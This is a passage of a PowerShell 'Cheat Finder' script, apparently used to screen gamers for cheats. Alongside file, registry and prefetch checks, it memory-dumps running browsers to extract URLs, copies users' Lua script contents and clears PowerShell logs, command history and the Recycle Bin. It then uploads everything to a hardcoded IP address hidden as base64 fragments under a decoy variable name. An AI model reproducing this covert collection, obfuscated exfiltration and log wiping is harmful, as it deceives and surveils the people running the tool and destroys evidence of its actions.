            if ($svchost.ExecutablePath -notlike "*\Windows\System32\svchost.exe") {
                Write-Host " [BETA] Path mismatch detected!" -ForegroundColor Red
                Write-Host " [BETA] PID: $($svchost.ProcessId)" -ForegroundColor Red
                Write-Host " [BETA] Path: $($svchost.ExecutablePath)" -ForegroundColor Red
                Write-Host " [BETA] This means a svchost.exe is running from an unexpected location!" -ForegroundColor Red
            }
        }
    }

    ####################################################################################################
    
    Write-Host " [havoc] Finding extra file extensions." -ForegroundColor White
    $searchPaths = @($env:UserProfile, "$env:UserProfile\Downloads")
    $zipRarFiles = Get-ChildItem -Path $searchPaths -Recurse -Include *.zip, *.rar, *.7z, *.dll, *.sys, *.bin -File |
               Where-Object { $_.FullName -notmatch "minecraft|steam|epicgames|battlenet|origin|ubisoft|riotgames|valorant|league of legends|unity|unreal|adobe|microsoft|windows|programdata" } |
               Select-Object FullName
    
    if ($zipRarFiles.Count -gt 0) {
        foreach ($file in $zipRarFiles) {
            if ($file.FullName -match '\.(zip|rar|dll|sys)$') {
                $scanResults.ExtraExtensions.Files += $file.FullName
            }
        }
    }

    ####################################################################################################

    Write-Host " [havoc] Analyzing journal activities..." -ForegroundColor White
    try {
        $volumes = Get-WmiObject -Class Win32_Volume | Where-Object { $_.FileSystem -eq 'NTFS' }
        foreach ($volume in $volumes) {
            $fsutil = & fsutil usn queryjournal $volume.DriveLetter
            if ($fsutil -match "No USN records found") {
                Write-Host " [havoc] USN Journal cleared on drive $($volume.DriveLetter)" -ForegroundColor Red
            }
        }

        $fsChanges = Get-WinEvent -FilterHashtable @{
            LogName = 'Security'
            ID = @(4656, 4658, 4660, 4663) 
            StartTime = (Get-Date).AddDays(-1)
        } -ErrorAction Stop | Where-Object {
            $_.Message -match "Object Type:\s+File" -and
            $_.Message -match "\.journal|\.log|\.etl"
        }

        $deletionEvents = Get-WinEvent -FilterHashtable @{
            LogName = 'Security'
            ID = @(3079, 4660, 4663)
            StartTime = (Get-Date).AddDays(-7)
        } -ErrorAction Stop | Where-Object {
            ($_.Id -eq 3079) -or
            (($_.Message -match "Object Type:\s+File") -and
            ($_.Message -match "Access:\s+DELETE") -and
            ($_.Message -match "\\Windows\\System32|\\Windows\\SysWOW64|\\Program Files|\\Users\\.*\\AppData"))
        }
    
        foreach ($event in $deletionEvents) {
            $scanResults.JournalActivity.FileDeletions += @{
                TimeCreated = $event.TimeCreated
                EventID = $event.Id
                Path = if ($event.Id -eq 3079) {
                    ($event.Properties | Where-Object { $_.Value -like "*.journal" }).Value
                } else {
                    $event.Properties[6].Value
                }
            }
        }

        $scanResults.JournalActivity = @{
            USNStatus = $fsutil
            FileSystemModifications = $fsChanges
        }

    } catch {
        Write-Host " [havoc] Journal analysis encountered an error or no activity was found" -ForegroundColor Yellow
    }

    ####################################################################################################

    Write-Host " [havoc] Analyzing Prefetch Files..." -ForegroundColor White
    $prefetchPath = "C:\Windows\Prefetch"

    $prefetchKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
    if (Test-Path $prefetchKey) {
        $enablePrefetcher = (Get-ItemProperty -Path $prefetchKey -Name EnablePrefetcher -ErrorAction SilentlyContinue).EnablePrefetcher
        if ($null -eq $enablePrefetcher -or $enablePrefetcher -eq 0) {
            Write-Host " [havoc] Prefetch is DISABLED" -ForegroundColor Red
        }
    }

    try {
        if (Test-Path $prefetchPath) {
            $files = Get-ChildItem -Path $prefetchPath -Filter *.pf
            $hashTable = @{}
            $suspiciousFiles = @{}

            foreach ($file in $files) {
                if ($file.IsReadOnly) {
                    $suspiciousFiles[$file.Name] = "Read-only prefetch file detected"
                    Write-Host " [havoc] Read-only prefetch file detected: $($file.Name)" -ForegroundColor Red
                }

                $reader = [System.IO.StreamReader]::new($file.FullName)
                $buffer = New-Object char[] 3
                $null = $reader.ReadBlock($buffer, 0, 3)
                $reader.Close()

                $firstThreeChars = -join $buffer

                if ($firstThreeChars -ne "MAM") {
                    $suspiciousFiles[$file.Name] = "Invalid prefetch file signature"
                    Write-Host " [havoc] Invalid prefetch file signature: $($file.Name)" -ForegroundColor Red
                }

                $hash = Get-FileHash -Path $file.FullName -Algorithm SHA256

                if ($hashTable.ContainsKey($hash.Hash)) {
                    $hashTable[$hash.Hash].Add($file.Name)
                } else {
                    $hashTable[$hash.Hash] = [System.Collections.Generic.List[string]]::new()
                    $hashTable[$hash.Hash].Add($file.Name)
                }
            }

            $repeatedHashes = $hashTable.GetEnumerator() | Where-Object { $_.Value.Count -gt 1 }

            foreach ($entry in $repeatedHashes) {
                foreach ($file in $entry.Value) {
                    $suspiciousFiles[$file] = "Modified prefetch file detected"
                    Write-Host " [havoc] Modified prefetch file detected: $($file)" -ForegroundColor Red
                }
            }

            $scanResults.PrefetchAnalysis = @{
                SuspiciousFiles = $suspiciousFiles
                DuplicateHashes = $repeatedHashes
                AllPrefetchFiles = $files | Select-Object Name, Length, FullName
            }

        } else {
            Write-Host " [havoc] Prefetch folder not found." -ForegroundColor White
        }
    } catch [System.UnauthorizedAccessException] {
        Write-Host " [havoc] Access to Prefetch folder denied. Run as administrator." -ForegroundColor Yellow
    } catch {
        Write-Host " [havoc] Error analyzing Prefetch folder: $($_.Exception.Message)" -ForegroundColor Red
    }

    $monitorCheck = Test-MonitorReplication
    $scanResults.MonitorReplication.Detected = $monitorCheck.ReplicationDetected
    $scanResults.MonitorReplication.Evidence = $monitorCheck.Evidence
    $scanResults.MonitorReplication.MonitorCount = $monitorCheck.MonitorCount 

}

####################################################################################################

function Get-HiddenFiles {
    $userPaths = @(
        [Environment]::GetFolderPath('Desktop'),
        [Environment]::GetFolderPath('MyDocuments'),
        [Environment]::GetFolderPath('MyPictures'),
        [Environment]::GetFolderPath('MyVideos'),
        [Environment]::GetFolderPath('History'),
        "$env:USERPROFILE\Downloads",
        [Environment]::GetFolderPath('Favorites'),
        [Environment]::GetFolderPath('Recent'),
        [Environment]::GetFolderPath('Personal')
    )
    
    $hiddenFiles = @()
    foreach ($path in $userPaths) {
        $hiddenFiles += Get-ChildItem -Path $path -Force -Recurse | 
            Where-Object { $_.Attributes -match 'Hidden' } |
            ForEach-Object {
                "$($_.FullName) $($_.LastWriteTime.ToString('M/d/yyyy h:mm tt')) $($_.Length)"
            }
    }
    
    $suspiciousFiles = @()
    foreach ($path in $userPaths) {
        $suspiciousFiles += Get-ChildItem -Path $path -Force -Recurse | 
            Where-Object { 
                $_.Name -match '[\u200B-\u200F\u202A-\u202E\uFEFF]' -or
                $_.Name -match '\.[^\.]{0,3}exe' -or
                $_.Extension -match '^\.[0-9a-zA-Z]{20,}' -or
                $_.Extension -match '^\.[^\.]+\.[^\.]+' 
            } |
            ForEach-Object {
                "$($_.FullName) $($_.LastWriteTime.ToString('M/d/yyyy h:mm tt')) $($_.Length)"
            }
    }
    
    return @{
        HiddenFiles = $hiddenFiles
        SuspiciousFiles = $suspiciousFiles
    }
}

####################################################################################################

function Test-WindowsRuntime {
    $requiredServices = @{
        'DPS' = 'Diagnostic Policy Service'
        'DiagTrack' = 'Connected User Experiences and Telemetry'
        'SysMain' = 'SysMain'
        'EventLog' = 'Windows Event Log'
        'CsrSs' = 'Client Server Runtime Process'
        'WinDefend' = 'Windows Defender'
        'Winmgmt' = 'Windows Management Instrumentation'
    }
    
    $windowsStartTime = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
    $anomalies = @()
    $serviceRuntimes = @{}
    $criticalServiceStatus = @{}
    
    foreach ($service in $requiredServices.GetEnumerator()) {
        $svc = Get-Service -Name $service.Key -ErrorAction SilentlyContinue
        if ($svc) {
            try {
                $svcProcess = Get-WmiObject -Class Win32_Service -Filter "Name='$($service.Key)'" | 
                    Select-Object -ExpandProperty ProcessId
                $svcRuntime = (Get-Process -Id $svcProcess -ErrorAction SilentlyContinue).StartTime
                $serviceRuntimes[$service.Value] = $svcRuntime

                if ($svc.Status -ne 'Running') {
                    $anomalies += "$($service.Value) is not running (Status: $($svc.Status))"
                    if ($service.Key -in @('SysMain', 'CsrSs', 'Winmgmt')) {
                        $criticalServiceStatus[$service.Value] = "CRITICAL SERVICE STOPPED"
                    }
                }
                
                if ($svcRuntime -and $svcRuntime -gt $windowsStartTime.AddMinutes(5)) {
                    $anomalies += "$($service.Value) started at $svcRuntime (after Windows start)"
                }
            }
            catch {
                $anomalies += "$($service.Value) process information unavailable"
            }
        }
    }
    
    return @{
        WindowsStartTime = $windowsStartTime
        ServiceRuntimes = $serviceRuntimes
        ServiceAnomalies = $anomalies
        CriticalServices = $criticalServiceStatus
    }
}

####################################################################################################

function Get-UserActivity {
    $users = Get-WmiObject -Class Win32_UserProfile | 
        Where-Object { $_.Special -eq $false }
    
    $userActivity = @()
    foreach ($user in $users) {
        $sid = $user.SID
        $username = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value
        
        $lastLoginTime = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid" -Name LastLogonTime -ErrorAction SilentlyContinue
        
        $profileLastWrite = if (Test-Path $user.LocalPath) {
            (Get-Item $user.LocalPath).LastWriteTime
        } else {
            $null
        }
        
        $lastActivity = if ($lastLoginTime.LastLogonTime) {
            [DateTime]::FromFileTime($lastLoginTime.LastLogonTime)
        } else {
            $profileLastWrite
        }
        
        $userActivity += [PSCustomObject]@{
            Username = $username
            LastLogin = $lastActivity.ToString("yyyy-MM-dd HH:mm:ss")
            ProfilePath = $user.LocalPath
        }
    }
    
    return $userActivity
}

##############################################################################

function Test-MonitorReplication {
    $replicationDetected = $false
    $evidenceList = @()
    
    $displayPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\DISPLAY"
    if (Test-Path $displayPath) {
        $displayFolders = Get-ChildItem $displayPath
        
        $uidMap = @{}
        $edidMap = @{}
        $serialMap = @{}
        $modelNameMap = @{}
        $instanceIdMap = @{}
        
        foreach ($displayFolder in $displayFolders) {
            $displayName = Split-Path -Leaf $displayFolder.PSPath
            $instanceFolders = Get-ChildItem $displayFolder.PSPath
            
            foreach ($instanceFolder in $instanceFolders) {
                $instancePath = $instanceFolder.PSPath
                $instanceName = Split-Path -Leaf $instancePath
                $deviceParams = Join-Path $instancePath "Device Parameters"
                
                if (-not $instanceIdMap.ContainsKey($instanceName)) {
                    $instanceIdMap[$instanceName] = @()
                }
                $instanceIdMap[$instanceName] += [PSCustomObject]@{
                    DisplayName = $displayName
                    InstanceName = $instanceName
                    Path = $instancePath
                }
                
                if (Test-Path $deviceParams) {
                    try {
                        $uidMatch = $instanceName -match ".*&(UID\d+)$"
                        $uid = if ($uidMatch) { $matches[1] } else { $instanceName }
                        
                        $edidData = (Get-ItemProperty -Path $deviceParams -Name EDID -ErrorAction SilentlyContinue).EDID
                        
                        if ($edidData) {
                            $edidHex = [System.BitConverter]::ToString($edidData).Replace("-", "")
                            
                            $manufacturerID = ""
                            $productCode = ""
                            $serialNumber = "Unknown"
                            $modelName = "Unknown"
                            $manufactureDate = "Unknown"
                            $edidVersion = "Unknown"
                            
                            if ($edidData.Length -ge 10) {
                                $mfrId = ($edidData[8] -shl 8) -bor $edidData[9]
                                $char1 = [char](($mfrId -shr 10) -band 0x1F + 64)
                                $char2 = [char](($mfrId -shr 5) -band 0x1F + 64)
                                $char3 = [char](($mfrId) -band 0x1F + 64)
                                $manufacturerID = "$char1$char2$char3"
                                
                                $productCode = ($edidData[11] -shl 8) -bor $edidData[10]
                            }
                            
                            if ($edidData.Length -ge 16) {
                                $serialBytes = $edidData[12..15]
                                $serialNumber = [System.BitConverter]::ToUInt32($serialBytes, 0)
                            }
                            
                            if ($edidData.Length -ge 20) {
                                $edidVersion = "$($edidData[18]).$($edidData[19])"
                            }
                            
                            if ($edidData.Length -ge 18) {
                                $week = $edidData[16]
                                $year = $edidData[17] + 1990
                                $manufactureDate = "Week $week, $year"
                            }
                            
                            if ($edidData.Length -ge 128) {
                                for ($i = 54; $i -lt 125; $i += 18) {
                                    if ($edidData[$i] -eq 0 -and $edidData[$i+1] -eq 0 -and $edidData[$i+2] -eq 0 -and $edidData[$i+3] -eq 0xFC) {
                                        $nameBytes = $edidData[($i+5)..($i+18)]
                                        $nameString = ""
                                        foreach ($byte in $nameBytes) {
                                            if ($byte -eq 0x0A) { break }
                                            $nameString += [char]$byte
                                        }
                                        $modelName = $nameString.Trim()
                                        break
                                    }
                                }
                            }
                            
                            $isSuspiciousEdid = $false
                            $suspiciousReason = ""
                            
                            if ($serialNumber -eq 0) {
                                $isSuspiciousEdid = $true
                                $suspiciousReason += "Zero serial number; "
                            }
                            
                            $currentYear = (Get-Date).Year
                            if ($year -gt $currentYear -or $year -lt 2010) {
                                $isSuspiciousEdid = $true
                                $suspiciousReason += "Suspicious manufacture date ($manufactureDate); "
                            }
                            
                            if ($week -gt 53 -or $week -lt 1) {
                                $isSuspiciousEdid = $true
                                $suspiciousReason += "Invalid week number ($week); "
                            }
                            
                            $knownFakeManufacturers = @("XYZ", "ABC", "AAA", "ZZZ", "000")
                            if ($knownFakeManufacturers -contains $manufacturerID) {
                                $isSuspiciousEdid = $true
                                $suspiciousReason += "Known fake manufacturer ID ($manufacturerID); "
                            }
                            
                            $monitorEntry = [PSCustomObject]@{
                                DisplayName = $displayName
                                InstanceName = $instanceName
                                Path = $instancePath
                                ManufacturerID = $manufacturerID
                                ProductCode = $productCode
                                SerialNumber = $serialNumber
                                ModelName = $modelName
                                ManufactureDate = $manufactureDate
                                EdidVersion = $edidVersion
                                IsSuspiciousEdid = $isSuspiciousEdid
                                SuspiciousReason = $suspiciousReason
                                UID = $uid
                                EdidHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new($edidData)) -Algorithm MD5).Hash
                            }
                            
                            if (-not $uidMap.ContainsKey($uid)) {
                                $uidMap[$uid] = @()
                            }
                            $uidMap[$uid] += $monitorEntry
                            
                            if (-not $edidMap.ContainsKey($edidHex)) {
                                $edidMap[$edidHex] = @()
                            }
                            $edidMap[$edidHex] += $monitorEntry
                            
                            if ($serialNumber -ne "Unknown" -and $serialNumber -ne 0) {
                                $serialKey = "$serialNumber"
                                if (-not $serialMap.ContainsKey($serialKey)) {
                                    $serialMap[$serialKey] = @()
                                }
                                $serialMap[$serialKey] += $monitorEntry
                            }
                            
                            if ($modelName -ne "Unknown") {
                                if (-not $modelNameMap.ContainsKey($modelName)) {
                                    $modelNameMap[$modelName] = @()
                                }
                                $modelNameMap[$modelName] += $monitorEntry
                            }
                            
                            if ($isSuspiciousEdid) {
                                $replicationDetected = $true
                                $evidenceList += "Suspicious EDID data detected for $displayName ($instanceName): $suspiciousReason"
                            }
                        }
                    } catch {
                        $evidenceList += "Error processing $deviceParams : $($_.Exception.Message)"
                    }
                }
            }
        }
        
        foreach ($instanceId in $instanceIdMap.Keys) {
            $entries = $instanceIdMap[$instanceId]
            if ($entries.Count -gt 1) {
                $uniqueDisplays = $entries | Select-Object -ExpandProperty DisplayName -Unique
                if ($uniqueDisplays.Count -gt 1) {
                    $replicationDetected = $true
                    $displayList = $uniqueDisplays -join ", "
                    $evidenceList += "Same Instance ID ($instanceId) used across different monitor models: $displayList"
                    
                    foreach ($entry in $entries) {
                        $evidenceList += "  - Model: $($entry.DisplayName), Path: $($entry.Path)"
                    }
                }
            }
        }
        
        foreach ($uid in $uidMap.Keys) {
            $entries = $uidMap[$uid]
            if ($entries.Count -gt 1) {
                $uniqueDisplays = $entries | Select-Object -ExpandProperty DisplayName -Unique
                if ($uniqueDisplays.Count -gt 1) {
                    $replicationDetected = $true
                    $displayList = $uniqueDisplays -join ", "
                    $evidenceList += "Same UID ($uid) used across different monitor models: $displayList"
                    
                    foreach ($entry in $entries) {
                        $evidenceList += "  - Model: $($entry.DisplayName), Instance: $($entry.InstanceName), Mfr: $($entry.ManufacturerID), Product: $($entry.ProductCode)"
                        $evidenceList += "    Serial: $($entry.SerialNumber), Model Name: $($entry.ModelName), Mfg Date: $($entry.ManufactureDate)"
                    }
                }
            }
        }
        
        foreach ($edid in $edidMap.Keys) {
            $entries = $edidMap[$edid]
            if ($entries.Count -gt 1) {
                $uniqueDisplays = $entries | Select-Object -ExpandProperty DisplayName -Unique
                if ($uniqueDisplays.Count -gt 1) {
                    $replicationDetected = $true
                    $displayList = $uniqueDisplays -join ", "
                    $evidenceList += "Identical EDID data used across different monitor models: $displayList"
                    
                    foreach ($entry in $entries) {
                        $evidenceList += "  - Model: $($entry.DisplayName), Instance: $($entry.InstanceName), UID: $($entry.UID), Mfr: $($entry.ManufacturerID), Product: $($entry.ProductCode)"
                        $evidenceList += "    Serial: $($entry.SerialNumber), Model Name: $($entry.ModelName), Mfg Date: $($entry.ManufactureDate)"
                    }
                }
            }
        }
        
        foreach ($serial in $serialMap.Keys) {
            $entries = $serialMap[$serial]
            if ($entries.Count -gt 1) {
                $uniqueDisplays = $entries | Select-Object -ExpandProperty DisplayName -Unique
                if ($uniqueDisplays.Count -gt 1) {
                    $replicationDetected = $true
                    $displayList = $uniqueDisplays -join ", "
                    $evidenceList += "Identical serial number ($serial) used across different monitor models: $displayList"
                    
                    foreach ($entry in $entries) {
                        $evidenceList += "  - Model: $($entry.DisplayName), Instance: $($entry.InstanceName), UID: $($entry.UID)"
                    }
                }
            }
        }
        
        foreach ($name in $modelNameMap.Keys) {
            $entries = $modelNameMap[$name]
            $uniqueDisplays = $entries | Select-Object -ExpandProperty DisplayName -Unique
            if ($uniqueDisplays.Count -gt 1) {
                $replicationDetected = $true
                $displayList = $uniqueDisplays -join ", "
                $evidenceList += "Same model name ($name) reported by different monitor types: $displayList"
            }
        }
    } else {
        $evidenceList += "Display registry path not found"
    }
    
    return @{
        ReplicationDetected = $replicationDetected
        Evidence = $evidenceList
        MonitorCount = if (Test-Path $displayPath) { (Get-ChildItem $displayPath).Count } else { 0 }
        UIDMap = $uidMap
        EDIDMap = $edidMap
        SerialMap = $serialMap
        ModelNameMap = $modelNameMap
        InstanceIdMap = $instanceIdMap
    }
}

##############################################################################

$fileResults = Get-HiddenFiles
$scanResults.HiddenFiles.Hidden += "Hidden Files Found:"
$scanResults.HiddenFiles.Hidden += $fileResults.HiddenFiles
$scanResults.HiddenFiles.Suspicious += "Suspicious Files Found:"
$scanResults.HiddenFiles.Suspicious += $fileResults.SuspiciousFiles


$runtimeCheck = Test-WindowsRuntime
$scanResults.WindowsServices.StartTime = $runtimeCheck.WindowsStartTime.ToString("yyyy-MM-dd HH:mm:ss")
$scanResults.WindowsServices.ServiceRuntimes = $runtimeCheck.ServiceRuntimes
$scanResults.WindowsServices.Anomalies = $runtimeCheck.ServiceAnomalies
$scanResults.WindowsServices.CriticalServices = $runtimeCheck.CriticalServices


$userActivity = Get-UserActivity
$scanResults.UserActivity += "User activity results:"
$scanResults.UserActivity += $userActivity

##############################################################################

function Test-AptitudeCheat {
    $aptitudePath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319"
    $ironSoftwareFiles = Get-ChildItem -Path $aptitudePath -Filter "*IronSoftware*" -File -ErrorAction SilentlyContinue

    if ($ironSoftwareFiles) {
        Write-Host " [havoc] Aptitude Cheat detected in Framework" -ForegroundColor Red
        return $true
    }
    return $false
}

function Test-LogiRecoilMacros {
    $potentialPaths = @(
        "$env:USERPROFILE\AppData\Local\LGHUB\scripts",
        "${env:ProgramFiles}\LGHUB\scripts",
        "${env:ProgramFiles(x86)}\LGHUB\scripts",
        "$env:USERPROFILE\AppData\Local\Logitech\LGHUB\scripts",
        "${env:ProgramFiles}\Logitech\LGHUB\scripts",
        "${env:ProgramFiles(x86)}\Logitech\LGHUB\scripts",
        "C:\Users\*\AppData\Local\LGHUB\scripts"
    )

    $basicPatterns = @(
        'MoveMouseRelative',
        'IsMouseButtonPressed',
        'EnablePrimaryMouseButtonEvents',
        'OnEvent.*MOUSE_BUTTON'
    )

    foreach ($basePath in $potentialPaths) {
        $luaFiles = Get-ChildItem -Path $basePath -Filter "*.lua" -File -Recurse -ErrorAction SilentlyContinue
        if ($luaFiles) {
            foreach ($file in $luaFiles) {
                $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue


                #saving content for any missed patterns, remove after gathering all pattern
                $scanResults.LuaFileContents += @{
                    Path = $file.FullName
                    Content = $content
                }
                
                foreach ($pattern in $basicPatterns) {
                    if ($content -match $pattern) {
                        Write-Host " [havoc] Detected mouse manipulation in: $($file.FullName)" -ForegroundColor Red
                        Write-Host " [havoc] Found pattern: $pattern" -ForegroundColor Red
                        return $true
                    }
                }
            }
        }
    }
    return $false
}

####################################################################################################

function Clear-PowerShellLogs {
    try {
        if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction Stop) {
            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
        }
    } catch {
        Write-Host " [havoc] err code psc1" -ForegroundColor Yellow
    }

    try {
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    } catch {
        Write-Host " [havoc] err code psc2" -ForegroundColor Yellow
    }

    Clear-History

    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) {
        try {
            Remove-Item $historyPath -Force -ErrorAction Stop
        } catch {
            Write-Host " [havoc] err code psc3" -ForegroundColor Yellow
        }
    }
}


####################################################################################################

function Start-BrowserMemoryScan {

    Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MemoryDumper {
    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        uint DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

    $tempDumpFile = Join-Path $env:TEMP "temp_dump.dmp"
    Write-Host " [havoc] Filtering Data Matches" -ForegroundColor Cyan

    $searchTerms = @("klar", "lethal", "linear", "codyware", "tomware", "sunshine", "ironsoftware", "revl", "demoncore", "Hypex", "ring-1", "eternity", "aptitude", "time2win", "lynxtech", "lavicheats", "skycheats", "cosmocheats", "veterancheats", "chlorinecheats", "thermitehvh", "apsmarket", "goldcore")
    $urlPattern = '(https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*))'

    $browserExeMap = @{
        'Chrome' = 'chrome.exe'
        'Firefox' = 'firefox.exe'
        'Edge' = 'msedge.exe'
        'Opera' = 'opera.exe'
        'Brave' = 'brave.exe'
    }

    $browserPaths = Get-BrowserPaths

    foreach ($browser in $browserPaths.Keys) {
        $browserExe = $browserExeMap[$browser]
        if (-not $browserExe) { continue }

        $browserFullPath = $null
        try {
            $browserFullPath = (Get-Command $browserExe -ErrorAction Stop).Path
        } catch {
            $possiblePaths = @(
                "${env:ProgramFiles}\$browser\$browserExe",
                "${env:ProgramFiles(x86)}\$browser\$browserExe",
                "${env:ProgramFiles}\Google\Chrome\Application\$browserExe",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application\$browserExe",
                "${env:ProgramFiles}\Microsoft\Edge\Application\$browserExe",
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\$browserExe",
                "${env:ProgramFiles}\Mozilla Firefox\$browserExe",
                "${env:ProgramFiles(x86)}\Mozilla Firefox\$browserExe",
                "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\$browserExe",
                "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application\$browserExe"
            )
            
            foreach ($path in $possiblePaths) {
                if (Test-Path $path) {
                    $browserFullPath = $path
                    break
                }
            }
            
            if (-not $browserFullPath) { continue }
        }
        
        $browserProcess = Start-Process $browserFullPath -PassThru
        Start-Sleep -Seconds 2  # Give browser time to initialize

        $processes = Get-Process -Name ($browserExe -replace '\.exe$', '') -ErrorAction SilentlyContinue
        $browserPIDs = $processes | Select-Object -ExpandProperty Id
        $parentProcess = $null

        foreach ($proc in $processes) {
            $wmiProcess = Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)"
            $parentPID = $wmiProcess.ParentProcessId

            if ($parentPID -notin $browserPIDs) {
                $parentProcess = $proc
                break
            }
            $wmiProcess.Dispose()
        }

        if ($parentProcess) {
            try {
                $processHandle = $parentProcess.Handle
                $processId = $parentProcess.Id

                $handle = [MemoryDumper]::CreateFile($tempDumpFile, 0x40000000, 2, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
                try {
                    $dumpFlags = 0x00000002 -bor 0x00001000
                    [void][MemoryDumper]::MiniDumpWriteDump($processHandle, $processId, $handle, $dumpFlags, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
                } finally {
                    [void][MemoryDumper]::CloseHandle($handle)
                }

                Start-Sleep -Milliseconds 100
                while (Test-Path $tempDumpFile) {
                    try {
                        $bytes = [System.IO.File]::ReadAllBytes($tempDumpFile)
                        break
                    } catch {
                        Start-Sleep -Milliseconds 100
                    }
                }

                $content = [System.Text.Encoding]::ASCII.GetString($bytes)
                $urlMatches = [regex]::Matches($content, $urlPattern)

                $scanResults.BrowserResults += "=== URLs found in $browser memory ==="
                $urlMatches | ForEach-Object {
                    $url = $_.Value
                    if ($url.Length -gt 400) {
                        return
                    }
                    foreach($term in $searchTerms) {
                        if($url -match $term) {
                            $scanResults.BrowserResults += $url
                        }
                    }
                }
            }
            finally {
                if ($processHandle) {
                    [void][MemoryDumper]::CloseHandle($processHandle)
                }
                if ($handle) {
                    [void][MemoryDumper]::CloseHandle($handle)
                }
                if (Test-Path $tempDumpFile) {
                    Remove-Item $tempDumpFile -Force -ErrorAction SilentlyContinue
                }
                if ($browserProcess) {
                    Stop-Process -Id $browserProcess.Id -Force -ErrorAction SilentlyContinue
                }
                [System.GC]::Collect()
                [System.GC]::WaitForPendingFinalizers()
            }
        }
    }
}



####################################################################################################

function Start-HavocAnalysis {

    Start-SystemAnalysis
    Start-BrowserMemoryScan


    $scanResults.apptitide = Test-AptitudeCheat
    $scanResults.lgrecoil = Test-LogiRecoilMacros
    if ($scanResults.apptitide) {
        Write-Host " [havoc] Aptitude Software Detected!" -ForegroundColor Red
    }
    if ($scanResults.lgrecoil) {
        Write-Host " [havoc] Logitech Recoil Scripts Detected!" -ForegroundColor Red 
    }

    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    Clear-PowerShellLogs
}


$havocArt = @"
   _____ _                _      ______ _           _           
  / ____| |              | |    |  ____(_)         | |          
 | |    | |__   ___  __ _| |_   | |__   _ _ __   __| | ___ _ __ 
 | |    | '_ \ / _ \/ _` | __|  |  __| | | '_ \ / _` |/ _ \ '__|
 | |____| | | |  __/ (_| | |_   | |    | | | | | (_| |  __/ |   
  \_____|_| |_|\___|\__,_|\__|  |_|    |_|_| |_|\__,_|\___|_|

                                                        -havoc
"@

Write-Host $havocArt -ForegroundColor Red

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This script needs to be run as Administrator. Please restart PowerShell as an Administrator and try again." -ForegroundColor Red
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    exit
}

$maxAttempts = 2
$attempt = 0
$badWords = @('fuck', 'shit', 'ass', 'dick', 'pussy', 'nigger', 'faggot', 'nigga', 'faggots', 'niggers', 'faggotry', 'cunt', 'coon', 'spic', 'beaner', 'hacker', 'blank', 'test')


############################################################

do {
    Write-Host "Enter your name to agree to a system scan"
    $inputName = Read-Host "Please enter your Name"
    
    if ([string]::IsNullOrWhiteSpace($inputName) -or ($badWords | Where-Object { $inputName -match $_ })) {
        $attempt++
        if ($attempt -ge $maxAttempts) {
            $inputName = $env:USERNAME
            Write-Host "Your name is $inputName" -ForegroundColor Yellow
            break
        }
        Write-Host "Invalid Name. Please try again." -ForegroundColor Red
        continue
    }
    break
    $scanResults.usernameinput = $inputName
} while ($true)

Start-HavocAnalysis


#####################################################################################
$trigger1 = "aHR0cDovLzE2"
$trigger2 = "Ny4xMTQuMTI0"
$trigger3 = "LjEwMzozMDAy"
$trigger4 = "L3NjYW4tcmVzdWx0cw=="
$testtriggerforcrashing = $trigger1 + $trigger2 + $trigger3 + $trigger4
$headers = @{
    "Content-Type" = "application/json"
    "Accept" = "application/json"
}

Write-Host " [havoc] Please wait for the analysis to complete..." -ForegroundColor Cyan
$body = $scanResults | ConvertTo-Json -Depth 10 -Compress
try {
    $decodedUri = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($testtriggerforcrashing))
    $response = Invoke-RestMethod -Uri $decodedUri -Method Post -Headers $headers -Body $body -ContentType "application/json; charset=utf-8" -TimeoutSec 30
    Write-Host " [havoc] Analysis completed" -ForegroundColor Green
} catch {
    try {
        $webRequest = [System.Net.WebRequest]::Create($decodedUri)
        $webRequest.Method = "POST"
        $webRequest.ContentType = "application/json"
        $webRequest.Accept = "application/json"
        $webRequest.Timeout = 30000
        
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $webRequest.ContentLength = $bytes.Length
        
        $requestStream = $webRequest.GetRequestStream()
        $requestStream.Write($bytes, 0, $bytes.Length)
        $requestStream.Close()
        
        $response = $webRequest.GetResponse()
        Write-Host " [havoc] Analysis completed using alternate method" -ForegroundColor Green
    } catch {
